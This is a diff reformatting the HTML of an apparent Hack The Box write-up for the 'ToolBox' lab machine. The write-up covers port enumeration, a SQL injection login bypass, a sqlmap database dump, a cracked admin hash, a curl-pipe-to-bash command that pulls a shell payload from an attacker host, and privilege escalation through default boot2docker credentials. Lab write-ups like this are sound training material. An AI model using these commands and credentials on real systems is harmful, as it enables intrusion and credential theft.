@@ -1,1 +1,165 @@
-<html><head><meta charset="utf-8"></head><body><p>Ports to check</p><p>ftp 21 - anonymous login is available but the only file is available</p><figure class="image image-style-block-align-left"><img style="aspect-ratio:557/117;" src="../img/posts/2024-06-03-ToolBox(HTB)/01-967c159039.png" width="557" height="117"></figure><p>ssh 22 - need creds</p><p>rpc 139 - anonymous login not allowed</p><p>webpage 443 - cert shows subdomain admin.megalogistic.com. I accidently added an S to megalogistic and accessed a real website and almost pentested an actual website called megalogistics.com</p><p>Adding admin.megalogistic.com gives us a login page</p><figure class="image"><img style="aspect-ratio:2533/1356;" src="../img/posts/2024-06-03-ToolBox(HTB)/02-4fb83800c7.png" width="2533" height="1356"></figure><figure class="image"><img style="aspect-ratio:1086/200;" src="../img/posts/2024-06-03-ToolBox(HTB)/03-11e7bd66ee.png" width="1086" height="200"></figure><p>&nbsp;</p><p>smb 445 - anonymous login not allowed</p><p>winrm 5985 - need creds</p><p>&nbsp;</p><p>&nbsp;</p><p><span class="text-huge" style="color:hsl(180,75%,60%);"><strong><u>Enumerating the web page</u></strong></span></p><p>Admin subdomain but requires creds, name found on the blog page.&nbsp;</p><p>Brandon Sharp<br>Christine Rooster<br>Connor Hodson</p><figure class="image"><img style="aspect-ratio:1191/509;" src="../img/posts/2024-06-03-ToolBox(HTB)/04-2dfd7386cb.png" width="1191" height="509"></figure><p>&nbsp;</p><p>&nbsp;</p><p>Nothing else interesting so I mounted the ftp share so I can run strings on the big exe file.</p><figure class="image"><img style="aspect-ratio:532/184;" src="../img/posts/2024-06-03-ToolBox(HTB)/05-a57ea6432a.png" width="532" height="184"></figure><p>&nbsp;</p><p>I transferred the docker file to my windows machine and its just a normal docker toolbox so there will be nothing interesting here. It does have a version number which could be helpful. Looks like there's no obvious vulnerabilities though.</p><figure class="image image-style-block-align-left"><img style="aspect-ratio:405/541;" src="../img/posts/2024-06-03-ToolBox(HTB)/06-e295cca32a.png" width="405" height="541"></figure><p>&nbsp;</p><p>&nbsp;</p><p>At this point I was stuck and looked back at the nmap scan, ssh is running OpenSSH for_Windows_7.7 and windows 7 is pretty outdated and I googled it and theres some known exploits for username enumeration but I couldnt find anything useful.</p><p>&nbsp;</p><p>Login page has SQL injection that I missed.</p><figure class="image image_resized" style="width:100%;"><img style="aspect-ratio:2321/360;" src="../img/posts/2024-06-03-ToolBox(HTB)/07-7d07c2ead8.png" width="2321" height="360"></figure><p>&nbsp;</p><p>We can sign in with this sql injection</p><p>admin'OR'1'='1'--</p><p>&nbsp;</p><figure class="image image-style-block-align-left"><img style="aspect-ratio:2235/1243;" src="../img/posts/2024-06-03-ToolBox(HTB)/08-d75ecfd963.png" width="2235" height="1243"></figure><p>&nbsp;</p><p>&nbsp;</p><p>Dump the database with sqlmap. In order for this to work I had to change my burp request as it was getting connection refused.</p><p>&nbsp;</p><p>I changed the host to include https:// before hand it was just admin.megalogistic.com. Changing it allowed sqlmap to work as expected.</p><figure class="image"><img style="aspect-ratio:942/407;" src="../img/posts/2024-06-03-ToolBox(HTB)/09-9101eb217f.png" width="942" height="407"></figure><p>&nbsp;</p><p><code>sqlmap -r request.txt --dump --batch</code><br>&nbsp;</p><p>&nbsp;</p><figure class="image image-style-block-align-left"><img style="aspect-ratio:1117/383;" src="../img/posts/2024-06-03-ToolBox(HTB)/10-cfc5ee1e7e.png" width="1117" height="383"></figure><p>&nbsp;</p><p>admin hash 4a100a85cb5ca3616dcf137918550815</p><figure class="image image-style-block-align-left"><img style="aspect-ratio:419/92;" src="../img/posts/2024-06-03-ToolBox(HTB)/11-878e56540a.png" width="419" height="92"></figure><p>&nbsp;</p><p>&nbsp;</p><p>couldnt get john or hashcat to crack it but this website has the hash in the database</p><p>https://hashes.com/en/decrypt/hash</p><p>admin:iamzeadmin</p><p>&nbsp;</p><p>We can sign into the admin portal using those creds but still no access to the machine.</p><p>&nbsp;</p><p>Used guided mode for a hint, we can use os-shell to execute system commands. This is a windows machine with docker running linux. Which I should have realized from the sql error stating index.php was located in /var/www/admin</p><p>&nbsp;</p><figure class="image image-style-block-align-left"><img style="aspect-ratio:945/441;" src="../img/posts/2024-06-03-ToolBox(HTB)/12-d8a94d8399.png" width="945" height="441"></figure><p>&nbsp;</p><p>&nbsp;</p><p>We can get a shell with curl</p><p><code>curl http://10.10.14.32:8000/pwn.sh | bash</code></p><figure class="image"><img style="aspect-ratio:686/197;" src="../img/posts/2024-06-03-ToolBox(HTB)/13-7c8441703a.png" width="686" height="197"></figure><p>&nbsp;</p><p>&nbsp;</p><p>There is a user but his directory is empty. Running linpeas finds us the user flag located at /var/lib/postgresql/user.txt.</p><p>&nbsp;</p><p>&nbsp;</p><figure class="image"><img style="aspect-ratio:1034/635;" src="../img/posts/2024-06-03-ToolBox(HTB)/14-a6cfd41a37.png" width="1034" height="635"></figure><p>&nbsp;</p><p>&nbsp;</p><p>I accidentally saw a write up on this when looking for priv esc. Some guy made a post show casing a “priv esc” but its just a guide on this machine sadly.</p><p>&nbsp;</p><p>The priv esc is seeing the docker IP above and SSH in with default docker creds. <strong>username for the boot2docker default user is docker and the password is tcuser</strong></p><figure class="image"><img style="aspect-ratio:968/319;" src="../img/posts/2024-06-03-ToolBox(HTB)/15-effeb06040.png" width="968" height="319"></figure><p>&nbsp;</p><p>I wouldnt have figured this out as ive never seen this before so i guess its a good thing I happened to stumble across the way.</p><p>&nbsp;</p><p>We cd to c which has a clone of the windows machine containing the admin user and the root.txt file. Really lame priv esc but I learned something new.</p><p>&nbsp;</p><figure class="image image-style-block-align-left"><img style="aspect-ratio:401/182;" src="../img/posts/2024-06-03-ToolBox(HTB)/16-ae2616210c.png" width="401" height="182"></figure></body></html>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <title>HTB: ToolBox | HackWithJordan</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="stylesheet" href="../assets/css/syntax.css">
+    <style>
+        body {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            margin: 0;
+            padding: 20px;
+            min-height: 100vh;
+            box-sizing: border-box;
+        }
+
+        .post {
+            width: 100%;
+            max-width: 900px;
+        }
+
+        .terminal {
+            background: #98AFC7;
+            padding: 15px;
+            border-radius: 5px;
+            overflow-x: auto;
+            max-width: 100%;
+            white-space: pre-wrap;
+            word-break: break-word;
+            font-family: monospace;
+            margin: 15px 0;
+        }
+
+        img {
+            max-width: 100%;
+            height: auto;
+            margin: 15px 0;
+            display: block;
+        }
+
+        p {
+            margin: 15px 0;
+            line-height: 1.5;
+            overflow-wrap: anywhere;
+        }
+
+        code {
+            overflow-wrap: anywhere;
+        }
+    </style>
+</head>
+<body>
+
+    <article class="post">
+        <header style="display: flex; align-items: center; gap: 20px;">
+            <img src="../img/posts/2024-06-03-ToolBox(HTB)/01-967c159039.png" alt="HTB: ToolBox cover" style="height: 80px; border-radius: 4px;">
+            <div>
+                <h1 style="margin: 0;">HTB: ToolBox</h1>
+                <div class="post-meta">June 3, 2024 &bull; HTB</div>
+            </div>
+        </header>
+
+        <p>Ports to check</p>
+
+        <p>ftp 21 - anonymous login is available but the only file is available</p>
+
+        <img alt="Screenshot 1" height="117" src="../img/posts/2024-06-03-ToolBox(HTB)/01-967c159039.png" style="aspect-ratio:557/117;" width="557"/>
+
+        <p>ssh 22 - need creds</p>
+
+        <p>rpc 139 - anonymous login not allowed</p>
+
+        <p>webpage 443 - cert shows subdomain admin.megalogistic.com. I accidently added an S to megalogistic and accessed a real website and almost pentested an actual website called megalogistics.com</p>
+
+        <p>Adding admin.megalogistic.com gives us a login page</p>
+
+        <img alt="Screenshot 2" height="1356" src="../img/posts/2024-06-03-ToolBox(HTB)/02-4fb83800c7.png" style="aspect-ratio:2533/1356;" width="2533"/>
+
+        <img alt="Screenshot 3" height="200" src="../img/posts/2024-06-03-ToolBox(HTB)/03-11e7bd66ee.png" style="aspect-ratio:1086/200;" width="1086"/>
+
+        <p>smb 445 - anonymous login not allowed</p>
+
+        <p>winrm 5985 - need creds</p>
+
+        <h1 style="color:red;">Enumerating the web page</h1>
+
+        <p>Admin subdomain but requires creds, name found on the blog page. </p>
+
+        <p>Brandon Sharp<br/>Christine Rooster<br/>Connor Hodson</p>
+
+        <img alt="Screenshot 4" height="509" src="../img/posts/2024-06-03-ToolBox(HTB)/04-2dfd7386cb.png" style="aspect-ratio:1191/509;" width="1191"/>
+
+        <p>Nothing else interesting so I mounted the ftp share so I can run strings on the big exe file.</p>
+
+        <img alt="Screenshot 5" height="184" src="../img/posts/2024-06-03-ToolBox(HTB)/05-a57ea6432a.png" style="aspect-ratio:532/184;" width="532"/>
+
+        <p>I transferred the docker file to my windows machine and its just a normal docker toolbox so there will be nothing interesting here. It does have a version number which could be helpful. Looks like there's no obvious vulnerabilities though.</p>
+
+        <img alt="Screenshot 6" height="541" src="../img/posts/2024-06-03-ToolBox(HTB)/06-e295cca32a.png" style="aspect-ratio:405/541;" width="405"/>
+
+        <p>At this point I was stuck and looked back at the nmap scan, ssh is running OpenSSH for_Windows_7.7 and windows 7 is pretty outdated and I googled it and theres some known exploits for username enumeration but I couldnt find anything useful.</p>
+
+        <p>Login page has SQL injection that I missed.</p>
+
+        <img alt="Screenshot 7" height="360" src="../img/posts/2024-06-03-ToolBox(HTB)/07-7d07c2ead8.png" style="aspect-ratio:2321/360;" width="2321"/>
+
+        <p>We can sign in with this sql injection</p>
+
+        <p>admin'OR'1'='1'--</p>
+
+        <img alt="Screenshot 8" height="1243" src="../img/posts/2024-06-03-ToolBox(HTB)/08-d75ecfd963.png" style="aspect-ratio:2235/1243;" width="2235"/>
+
+        <p>Dump the database with sqlmap. In order for this to work I had to change my burp request as it was getting connection refused.</p>
+
+        <p>I changed the host to include https:// before hand it was just admin.megalogistic.com. Changing it allowed sqlmap to work as expected.</p>
+
+        <img alt="Screenshot 9" height="407" src="../img/posts/2024-06-03-ToolBox(HTB)/09-9101eb217f.png" style="aspect-ratio:942/407;" width="942"/>
+
+        <pre class="terminal"><code>sqlmap -r request.txt --dump --batch</code></pre>
+
+        <img alt="Screenshot 10" height="383" src="../img/posts/2024-06-03-ToolBox(HTB)/10-cfc5ee1e7e.png" style="aspect-ratio:1117/383;" width="1117"/>
+
+        <p>admin hash 4a100a85cb5ca3616dcf137918550815</p>
+
+        <img alt="Screenshot 11" height="92" src="../img/posts/2024-06-03-ToolBox(HTB)/11-878e56540a.png" style="aspect-ratio:419/92;" width="419"/>
+
+        <p>couldnt get john or hashcat to crack it but this website has the hash in the database</p>
+
+        <p>https://hashes.com/en/decrypt/hash</p>
+
+        <p>admin:iamzeadmin</p>
+
+        <p>We can sign into the admin portal using those creds but still no access to the machine.</p>
+
+        <p>Used guided mode for a hint, we can use os-shell to execute system commands. This is a windows machine with docker running linux. Which I should have realized from the sql error stating index.php was located in /var/www/admin</p>
+
+        <img alt="Screenshot 12" height="441" src="../img/posts/2024-06-03-ToolBox(HTB)/12-d8a94d8399.png" style="aspect-ratio:945/441;" width="945"/>
+
+        <p>We can get a shell with curl</p>
+
+        <pre class="terminal"><code>curl http://10.10.14.32:8000/pwn.sh | bash</code></pre>
+
+        <img alt="Screenshot 13" height="197" src="../img/posts/2024-06-03-ToolBox(HTB)/13-7c8441703a.png" style="aspect-ratio:686/197;" width="686"/>
+
+        <p>There is a user but his directory is empty. Running linpeas finds us the user flag located at /var/lib/postgresql/user.txt.</p>
+
+        <img alt="Screenshot 14" height="635" src="../img/posts/2024-06-03-ToolBox(HTB)/14-a6cfd41a37.png" style="aspect-ratio:1034/635;" width="1034"/>
+
+        <p>I accidentally saw a write up on this when looking for priv esc. Some guy made a post show casing a “priv esc” but its just a guide on this machine sadly.</p>
+
+        <p>The priv esc is seeing the docker IP above and SSH in with default docker creds. <strong>username for the boot2docker default user is docker and the password is tcuser</strong></p>
+
+        <img alt="Screenshot 15" height="319" src="../img/posts/2024-06-03-ToolBox(HTB)/15-effeb06040.png" style="aspect-ratio:968/319;" width="968"/>
+
+        <p>I wouldnt have figured this out as ive never seen this before so i guess its a good thing I happened to stumble across the way.</p>
+
+        <p>We cd to c which has a clone of the windows machine containing the admin user and the root.txt file. Really lame priv esc but I learned something new.</p>
+
+        <img alt="Screenshot 16" height="182" src="../img/posts/2024-06-03-ToolBox(HTB)/16-ae2616210c.png" style="aspect-ratio:401/182;" width="401"/>
+    </article>
+
+</body>
+</html>
